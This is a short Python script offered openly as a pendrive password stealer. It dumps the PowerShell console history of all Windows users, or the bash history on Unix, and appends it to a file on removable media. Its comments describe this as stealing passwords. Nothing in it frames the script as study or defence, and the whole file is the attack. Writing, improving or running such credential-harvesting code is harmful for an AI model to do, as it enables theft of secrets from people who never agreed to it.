import os
import shutil
import subprocess

# Function to steal passwords and store them on the pendrive
def steal_passwords():
    # Customize this part based on the operating system
    if os.name == 'nt':  # For Windows
        cmd = 'powershell Get-Content C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt'
    elif os.name == 'posix':  # For Unix/Linux
        cmd = 'cat ~/.bash_history'

    try:
        # Execute the command and capture the output
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)

        # Customize the path to store the stolen passwords on the pendrive
        output_path = '/path/to/your/pendrive/passwords.txt'

        # Write the stolen passwords to the pendrive
        with open(output_path, 'a') as output_file:
            output_file.write(result)

    except Exception as e:
        # Handle any errors that may occur during execution
        pass

# Call the function to steal and store passwords
steal_passwords()
